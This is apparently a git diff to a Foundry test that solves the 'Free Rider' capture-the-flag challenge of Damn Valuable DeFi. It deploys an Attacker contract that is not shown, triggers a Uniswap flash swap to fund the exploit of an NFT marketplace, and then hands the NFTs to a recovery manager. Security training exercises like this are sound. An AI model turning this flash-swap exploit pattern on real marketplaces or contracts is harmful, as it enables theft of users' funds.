@@ -11,6 +11,7 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
 import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {Attacker} from "./Attacker.sol";
 
 contract FreeRiderChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -124,6 +125,19 @@ contract FreeRiderChallenge is Test {
      */
     function test_freeRider() public checkSolvedByPlayer {
         
+        
+        // uint256[] memory prices = new uint256[](AMOUNT_OF_NFTS);
+        // for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
+        //     ids[i] = i;
+        //     prices[i] = 1e17;
+        // }
+        Attacker attacker = new Attacker{value:player.balance}(marketplace, weth, uniswapPair, nft);
+        // weth.approve(address(attacker), NFT_PRICE);
+        uniswapPair.swap(NFT_PRICE, 0, address(attacker), hex"deadbeaf");
+        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
+            nft.safeTransferFrom(player, address(recoveryManager), i, abi.encode(player));
+        }
+        weth.withdraw(weth.balanceOf(player));
     }
 
     /**
